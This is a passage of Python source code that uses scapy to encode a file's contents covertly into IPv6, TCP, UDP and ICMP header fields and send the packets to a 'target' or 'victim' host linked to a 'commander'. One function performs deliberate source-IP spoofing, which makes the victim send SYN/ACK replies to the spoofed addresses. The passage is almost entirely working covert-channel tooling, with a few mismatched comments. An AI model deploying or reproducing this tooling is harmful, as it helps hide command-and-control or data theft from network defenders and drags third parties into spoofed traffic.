    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv6_flow_label(client_sock: socket.socket,
                                  dest_ip: str,
                                  dest_port: int,
                                  file_path: str):
    """
    Hides file data covertly in IPv6 headers using the
    flow label field.

    @note Bit length
        The flow label field for IPv6 headers is 20 bits

    @param client_sock:
        A socket representing the client (target) socket

    @param dest_ip:
        A string representing the destination/target IP

    @param dest_port:
        A string representing the destination/target port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 20):
        binary_segment = binary_data[i:i + 20].ljust(20, '0')
        flow_label = int(binary_segment, 2)
        packet = IPv6(dst=dest_ip, fl=flow_label) / TCP(dport=dest_port)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv6_payload_length(client_sock: socket.socket,
                                      dest_ip: str,
                                      dest_port: int,
                                      file_path: str):
    """
    Hides file data covertly in IPv6 headers using the
    payload length field.

    @note Bit length
        The payload length field for IPv6 headers is 16 bits (2 bytes)

    @param client_sock:
        A socket representing the client (target) socket

    @param dest_ip:
        A string representing the destination/target IP

    @param dest_port:
        A string representing the destination/target port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 16):
        binary_segment = binary_data[i:i + 16].ljust(16, '0')
        payload_length = int(binary_segment, 2)
        packet = IPv6(dst=dest_ip, plen=payload_length) / TCP(dport=dest_port)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv6_next_header(client_sock: socket.socket,
                                   dest_ip: str,
                                   dest_port: int,
                                   file_path: str):
    """
    Hides file data covertly in IPv6 headers using the
    next header field.

    @note Bit length
        The next header field for IPv6 headers is 8 bits (1 byte)

    @param client_sock:
        A socket representing the client (target) socket

    @param dest_ip:
        A string representing the destination/target IP

    @param dest_port:
        A string representing the destination/target port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 8):
        binary_segment = binary_data[i:i + 8].ljust(8, '0')
        next_header = int(binary_segment, 2)
        packet = IPv6(dst=dest_ip, nh=next_header) / TCP(dport=dest_port)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv6_hop_limit(client_sock: socket.socket,
                                 dest_ip: str,
                                 dest_port: int,
                                 file_path: str):
    """
    Hides file data covertly in IPv6 headers using the
    hop limit field.

    @note Bit length
        The hop limit field for IPv6 headers is 8 bits (1 byte)

    @param client_sock:
        A socket representing the client (target) socket

    @param dest_ip:
        A string representing the destination/target IP

    @param dest_port:
        A string representing the destination/target port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 8):
        binary_segment = binary_data[i:i + 8].ljust(8, '0')
        hop_limit = int(binary_segment, 2)
        packet = IPv6(dst=dest_ip, hlim=hop_limit) / TCP(dport=dest_port)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv6_src_addr(client_sock: socket.socket,
                                dest_ip: str,
                                dest_port: int,
                                file_path: str):
    """
    Hides file data covertly in IPv6 headers using the
    source address field.

    @attention: // *** THIS IS SOURCE IP SPOOFING *** //
                Please use this wisely and with permission!!!

                This will send covert data under (SYN packets) to the victim; however -
                due to the TCP protocol used here, this forces the victim to send a
                SYN/ACK packet response to the spoofed addresses.

    @note Bit length
        The source address field for IPv6 headers is 128 bits (16 bytes)

    @param client_sock:
        A socket representing the client (target) socket

    @param dest_ip:
        A string representing the destination/target IP

    @param dest_port:
        A string representing the destination/target port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 32):
        binary_segment = binary_data[i:i + 32].ljust(32, '0')
        src_addr = ':'.join([binary_segment[j:j + 4] for j in range(0, 32, 4)])
        packet = IPv6(dst=dest_ip, src=src_addr) / TCP(dport=dest_port)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv6_dest_addr(client_sock: socket.socket,
                                 dest_ip: str,
                                 dest_port: int,
                                 file_path: str):
    """
    Hides file data covertly in IPv6 headers using the
    source address field.

    @attention: FUNCTIONALITY DISABLED
                Changing the destination IP field of the IP header will
                cause the packets created to be sent out to random IP
                addresses.

                The target victim will not be able to receive any
                crafted packets; hence - any covert data.

    @note Bit length
        The source address field for IPv6 headers is 128 bits (16 bytes)

    @param client_sock:
        A socket representing the client (target) socket

    @param dest_ip:
        A string representing the destination/target IP

    @param dest_port:
        A string representing the destination/target port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    print(constants.IPV6_DESTINATION_FIELD_ERROR)


# ===================== TCP INSERT COVERT DATA FUNCTIONS =====================


def transfer_file_tcp_src_port(client_sock: socket.socket,
                               dest_ip: str,
                               dest_port: int,
                               src_port: int,
                               file_path: str):
    """
    Hides file data covertly in TCP headers using the
    source port field.

    @note Bit length
        The source port field for TCP headers is 16 bits (2 Bytes)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param dest_port:
        A string representing the destination port

    @param src_port:
        A string representing the commander's port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 16):
        binary_segment = binary_data[i:i + 16].ljust(16, '0')
        new_src_port = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / TCP(sport=new_src_port, dport=dest_port)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_tcp_dst_port(client_sock: socket.socket,
                               dest_ip: str,
                               dest_port: int,
                               src_port: int,
                               file_path: str):
    """
    Hides file data covertly in TCP headers using the
    destination port field.

    @note Bit length
        The destination port field for TCP headers is 16 bits (2 Bytes)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param dest_port:
        A string representing the destination port

    @param src_port:
        A string representing the commander's port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 16):
        binary_segment = binary_data[i:i + 16].ljust(16, '0')
        new_dest_port = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / TCP(sport=src_port, dport=new_dest_port)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_tcp_seq_num(client_sock: socket.socket,
                              dest_ip: str,
                              dest_port: int,
                              src_port: int,
                              file_path: str):
    """
    Hides file data covertly in TCP headers using the
    sequence number field.

    @note Bit length
        The sequence number field for TCP headers is 32 bits (4 Bytes)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param dest_port:
        A string representing the destination port

    @param src_port:
        A string representing the commander's port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 32):
        binary_segment = binary_data[i:i + 32].ljust(32, '0')
        sequence_num = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / TCP(sport=src_port, dport=dest_port, seq=sequence_num)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_tcp_ack_num(client_sock: socket.socket,
                              dest_ip: str,
                              dest_port: int,
                              src_port: int,
                              file_path: str):
    """
    Hides file data covertly in TCP headers using the
    acknowledgement number field.

    @note Bit length
        The acknowledgement number field for TCP headers is 32 bits (4 Bytes)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param dest_port:
        A string representing the destination port

    @param src_port:
        A string representing the commander's port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 32):
        binary_segment = binary_data[i:i + 32].ljust(32, '0')
        ack_num = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / TCP(sport=src_port, dport=dest_port, ack=ack_num)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_tcp_data_offset(client_sock: socket.socket,
                                  dest_ip: str,
                                  dest_port: int,
                                  src_port: int,
                                  file_path: str):
    """
    Hides file data covertly in TCP headers using the
    data-offset field.

    This is also known as the header
    length that indicates the length of the TCP header
    and specifies where the data portion starts.

    @note Bit length
        The data offset field for TCP headers is 4 bits

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param dest_port:
        A string representing the destination port

    @param src_port:
        A string representing the commander's port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 4):
        binary_segment = binary_data[i:i + 4].ljust(4, '0')
        data_offset = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / TCP(sport=src_port, dport=dest_port, dataofs=data_offset)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_tcp_reserved(client_sock: socket.socket,
                               dest_ip: str,
                               dest_port: int,
                               src_port: int,
                               file_path: str):
    """
    Hides file data covertly in TCP headers using the
    reserved field.

    @note Bit length
        The reserved field for TCP headers is 3 bits

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param dest_port:
        A string representing the destination port

    @param src_port:
        A string representing the commander's port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 3):
        binary_segment = binary_data[i:i + 3].ljust(3, '0')
        reserved_data = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / TCP(sport=src_port, dport=dest_port, reserved=reserved_data)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_tcp_flags(client_sock: socket.socket,
                            dest_ip: str,
                            dest_port: int,
                            src_port: int,
                            file_path: str):
    """
    Hides file data covertly in TCP headers using the
    various control flag fields.

    @attention The recipient may not be able to recover the original data due to
               various flags being set

    @note Bit length
        The control flags field for TCP headers is 9 bits for the different
        flags (ECN, ACK, SYN, FIN, etc.)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param dest_port:
        A string representing the destination port

    @param src_port:
        A string representing the commander's port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 9):  # 3 bit chunks
        binary_segment = binary_data[i:i + 9].ljust(9, '0')
        flag_data = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / TCP(sport=src_port, dport=dest_port, flags=flag_data)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_tcp_window_size(client_sock: socket.socket,
                                  dest_ip: str,
                                  dest_port: int,
                                  src_port: int,
                                  file_path: str):
    """
    Hides file data covertly in TCP headers using the
    window size field.

    @note Bit length
        The window size field for TCP headers is 16 bits (2 bytes)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param dest_port:
        A string representing the destination port

    @param src_port:
        A string representing the commander's port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 16):  # 16 bit chunks
        binary_segment = binary_data[i:i + 16].ljust(16, '0')
        window_data = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / TCP(sport=src_port, dport=dest_port, window=window_data)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_tcp_chksum(client_sock: socket.socket,
                             dest_ip: str,
                             dest_port: int,
                             src_port: int,
                             file_path: str):
    """
    Hides file data covertly in TCP headers using the
    checksum field.

    @note Bit length
        The checksum field for TCP headers is 16 bits (2 bytes)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param dest_port:
        A string representing the destination port

    @param src_port:
        A string representing the commander's port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 16):  # 16 bit chunks
        binary_segment = binary_data[i:i + 16].ljust(16, '0')
        chksum_data = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / TCP(sport=src_port, dport=dest_port, chksum=chksum_data)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_tcp_urgent_ptr(client_sock: socket.socket,
                                 dest_ip: str,
                                 dest_port: int,
                                 src_port: int,
                                 file_path: str):
    """
    Hides file data covertly in TCP headers using the
    urgent pointer field.

    @note Bit length
        The urgent pointer field for TCP headers is 16 bits (2 bytes)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param dest_port:
        A string representing the destination port

    @param src_port:
        A string representing the commander's port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 16):  # 16 bit chunks
        binary_segment = binary_data[i:i + 16].ljust(16, '0')
        urg_ptr_data = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / TCP(sport=src_port, dport=dest_port, urgptr=urg_ptr_data)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_tcp_options(client_sock: socket.socket,
                              dest_ip: str,
                              dest_port: int,
                              src_port: int,
                              file_path: str):
    """
    Hides file data covertly in TCP headers using the
    TimeStamp options field.

    @note Bit length
        - The options field for TCP headers is maximum 320 bits (40 bytes)
        - 16 bits chosen here for TimeStamp option (can be reduced for more covertness)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param dest_port:
        A string representing the destination port

    @param src_port:
        A string representing the commander's port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 16):  # 16 bit chunks
        binary_segment = binary_data[i:i + 16].ljust(16, '0')
        timestamp_val = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / TCP(sport=src_port,
                                       dport=dest_port,
                                       options=[(constants.TIMESTAMP, (timestamp_val, 0))])  # (ts_val, ts_echo)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


# ===================== UDP HEADER COVERT DATA FUNCTIONS =====================


def transfer_file_udp_src_port(client_sock: socket.socket,
                               dest_ip: str,
                               dest_port: int,
                               src_port: int,
                               file_path: str):
    """
    Hides file data covertly in UDP headers using the
    source port field.

    @note Bit length
        The source port field for UDP headers is maximum 16 bits (2 bytes)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param dest_port:
        A string representing the destination port

    @param src_port:
        A string representing the commander's port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 16):  # 16 bit chunks
        binary_segment = binary_data[i:i + 16].ljust(16, '0')
        new_src_port = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / UDP(sport=new_src_port, dport=dest_port)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_udp_dst_port(client_sock: socket.socket,
                               dest_ip: str,
                               dest_port: int,
                               src_port: int,
                               file_path: str):
    """
    Hides file data covertly in UDP headers using the
    destination port field.

    @note Bit length
        The destination port field for UDP headers is maximum 16 bits (2 bytes)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param dest_port:
        A string representing the destination port

    @param src_port:
        A string representing the commander's port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 16):  # 16 bit chunks
        binary_segment = binary_data[i:i + 16].ljust(16, '0')
        new_dst_port = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / UDP(sport=src_port, dport=new_dst_port)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_udp_length(client_sock: socket.socket,
                             dest_ip: str,
                             dest_port: int,
                             src_port: int,
                             file_path: str):
    """
    Hides file data covertly in UDP headers using the
    length field.

    @note Bit length
        The length field for UDP headers is maximum 16 bits (2 bytes)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param dest_port:
        A string representing the destination port

    @param src_port:
        A string representing the commander's port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 16):  # 16 bit chunks
        binary_segment = binary_data[i:i + 16].ljust(16, '0')
        length = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / UDP(sport=src_port, dport=dest_port, len=length)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_udp_chksum(client_sock: socket.socket,
                             dest_ip: str,
                             dest_port: int,
                             src_port: int,
                             file_path: str):
    """
    Hides file data covertly in UDP headers using the
    checksum field.

    @note Bit length
        The checksum field for UDP headers is maximum 16 bits (2 bytes)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param dest_port:
        A string representing the destination port

    @param src_port:
        A string representing the commander's port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 16):  # 16 bit chunks
        binary_segment = binary_data[i:i + 16].ljust(16, '0')
        chksum_data = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / UDP(sport=src_port, dport=dest_port, chksum=chksum_data)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


# ===================== ICMP HEADER COVERT DATA FUNCTIONS =====================


def transfer_file_icmp_type(client_sock: socket.socket,
                            dest_ip: str,
                            file_path: str):
    """
    Hides file data covertly in ICMP headers using the
    type field.

    @note Bit length
        The type field for ICMP headers is maximum 8 bits (1 byte)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 8):  # 8 bit chunks
        binary_segment = binary_data[i:i + 8].ljust(8, '0')
        type_data = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / ICMP(type=type_data)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_icmp_code(client_sock: socket.socket,
                            dest_ip: str,
                            file_path: str):
    """
    Hides file data covertly in ICMP headers using the
    code field.

    @note Bit length
        The code field for ICMP headers is maximum 8 bits (1 byte)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 8):  # 8 bit chunks
        binary_segment = binary_data[i:i + 8].ljust(8, '0')
        code_data = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / ICMP(code=code_data)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_icmp_chksum(client_sock: socket.socket,
                              dest_ip: str,
                              file_path: str):
    """
    Hides file data covertly in ICMP headers using the
    checksum field.

    @note Bit length
        The checksum field for ICMP headers is maximum 16 bits (2 bytes)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 16):  # 16 bit chunks
        binary_segment = binary_data[i:i + 16].ljust(16, '0')
        chksum_data = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / ICMP(chksum=chksum_data)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_icmp_identification(client_sock: socket.socket,
                                      dest_ip: str,
                                      file_path: str):
    """
    Hides file data covertly in ICMP headers using the
    identification field.

    @note Bit length
        The identification field for ICMP headers is maximum 16 bits (2 bytes)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 16):  # 16 bit chunks
        binary_segment = binary_data[i:i + 16].ljust(16, '0')
        id_data = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / ICMP(id=id_data)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_icmp_seq_num(client_sock: socket.socket,
                               dest_ip: str,
                               file_path: str):
    """
    Hides file data covertly in ICMP headers using the
    sequence number field.

    @note Bit length
        The sequence number field for ICMP headers is maximum 16 bits (2 bytes)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 16):  # 16 bit chunks
        binary_segment = binary_data[i:i + 16].ljust(16, '0')
        seq_num_data = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / ICMP(seq=seq_num_data)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def __get_protocol_header_transfer_function_map():
    return {  # A tuple of [Header, Field] => Function
        # a) IPv4 Handlers
        ("IPv4", "Version"): transfer_file_ipv4_version,
        ("IPv4", "IHL (Internet Header Length)"): transfer_file_ipv4_ihl,
